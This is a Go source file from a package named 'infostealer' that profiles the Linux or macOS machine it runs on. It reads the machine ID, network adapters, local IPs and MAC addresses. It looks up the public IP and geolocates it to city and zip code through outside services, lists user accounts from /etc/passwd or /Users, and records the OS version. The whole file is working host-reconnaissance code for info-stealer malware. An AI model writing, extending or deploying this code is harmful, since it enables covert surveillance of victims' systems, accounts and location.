//go:build linux || darwin

package infostealer

import (
	"bufio"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type Sysinfo[T any] struct {
	Users       []T
	Hwid        string
	OSVersion   string
	NetworkInfo []struct {
		LocalIPs []string
		Adapter  string
		MacAddr  string
	}
	ExposedIP string
	Location  string
}

func (info *Sysinfo[T]) getNetworkInfo() {
	hwid, _ := os.ReadFile(filepath.Join("/etc", "machine-id"))
	info.Hwid = string(hwid)

	interfaces, _ := net.Interfaces()
	for _, iface := range interfaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.HardwareAddr == nil {
			continue
		}

		addrs, _ := iface.Addrs()
		var ips []string
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ips = append(ips, ip.String())
		}

		info.NetworkInfo = append(info.NetworkInfo, struct {
			LocalIPs []string
			Adapter  string
			MacAddr  string
		}{
			LocalIPs: ips,
			Adapter:  iface.Name,
			MacAddr:  iface.HardwareAddr.String(),
		})
	}
}

func (sysinfo *Sysinfo[T]) getExposedInfo() {
	r, err := http.Get("https://api.ipify.org?format=json")
	if err != nil {
		return
	}
	defer r.Body.Close()

	var ipData struct {
		IP string `json:"ip"`
	}
	if err := json.NewDecoder(r.Body).Decode(&ipData); err != nil {
		return
	}
	sysinfo.ExposedIP = ipData.IP

	r2, err := http.Get("http://ip-api.com/json/" + sysinfo.ExposedIP)
	if err != nil {
		return
	}
	defer r2.Body.Close()

	var geo struct {
		Status  string `json:"status"`
		Country string `json:"country"`
		Region  string `json:"regionName"`
		City    string `json:"city"`
		Zipcode string `json:"zip"`
	}
	if err := json.NewDecoder(r2.Body).Decode(&geo); err == nil {
		sysinfo.Location = geo.City + ", " + geo.Region + " " + geo.Zipcode + ", " + geo.Country
	}
}

type passwdUser struct {
	Username string
	UserID   string
	GroupID  string
	Comments string
	HomeDir  string
	Shell    string
}

type passwdUsers []passwdUser
type SysinfoLinux struct {
	Sysinfo[passwdUser]
}
type SysinfoMac struct {
	Sysinfo[string]
}

func (info *SysinfoLinux) getOSVersion() {
	file, _ := os.ReadFile("/etc/os-release")

	scanner := bufio.NewScanner(strings.NewReader(string(file)))
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), "PRETTY_NAME") {
			info.OSVersion = scanner.Text()[13 : len(scanner.Text())-1]
		}
	}
}

func (info *SysinfoMac) getOSVersion() {
	str, _ := exec.Command("sw_vers", "-productName").Output()
	str2, _ := exec.Command("sw_vers", "-productVersion").Output()
	info.OSVersion = string(str) + " (" + string(str2) + ")" //Mac OS (x.x.x) or whatever
}

func (info *SysinfoLinux) getUsers() {
	file, err := os.ReadFile(filepath.Join("/etc", "passwd"))
	if err != nil {
		// now 'info.users' is recognized as a slice of passwduser
		info.Users = append(info.Users, passwdUser{
			Username: "passwd file restricted",
		})
		return
	}

	scanner := bufio.NewScanner(strings.NewReader(string(file)))

	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")

		// basic check to prevent index-out-of-range crashes
		if len(parts) < 7 {
			continue
		}

		// filter out system accounts (index 6 is shell in /etc/passwd)
		shell := parts[6]
		switch shell {
		case "/usr/sbin/nologin", "/bin/false", "/bin/sync":
			continue // skip this user, keep looking for others
		}

		// corrected append: use info.users (the field), not *info (the struct)
		info.Users = append(info.Users, passwdUser{
			Username: parts[0],
			UserID:   parts[2],
			GroupID:  parts[3],
			Comments: parts[4],
			HomeDir:  parts[5],
			Shell:    shell,
		})
	}
}

func (info *SysinfoMac) getUsers() {
	folder, _ := os.ReadDir("/Users")
	for _, subdir := range folder {
		if !subdir.IsDir() {
			continue
		}

		info.Users = append(info.Users, subdir.Name())
	}
}

type SysinfoCollector interface {
	getNetworkInfo()
	getExposedInfo()
	getUsers()
	getOSVersion()
}

func System() SysinfoCollector {
	var sysinfo SysinfoCollector
	switch runtime.GOOS {
	case "linux":
		sysinfo = &SysinfoLinux{}
	case "darwin":
		sysinfo = &SysinfoMac{}
	}

	sysinfo.getExposedInfo()
	sysinfo.getNetworkInfo()
	sysinfo.getUsers()
	sysinfo.getOSVersion()
	return sysinfo
}
